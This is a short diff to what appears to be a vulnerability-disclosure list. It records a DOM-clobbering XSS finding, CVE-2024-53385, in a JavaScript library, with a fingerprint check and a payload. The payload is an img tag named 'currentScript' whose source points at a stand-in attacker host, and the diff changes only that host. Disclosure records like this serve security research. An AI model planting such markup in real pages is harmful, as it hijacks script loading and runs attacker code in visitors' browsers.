@@ -6,7 +6,7 @@
 + Stars: 1.7K
 + Version: v1.10
 + Fingerprint: `window.hasOwnProperty('inspireLoaded')`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx"></img>```
++ Payload: ```<img name="currentScript" src="https://attack.hulk"></img>```
 + Impact: XSS
 + Status: Reported
 + CVE: CVE-2024-53385
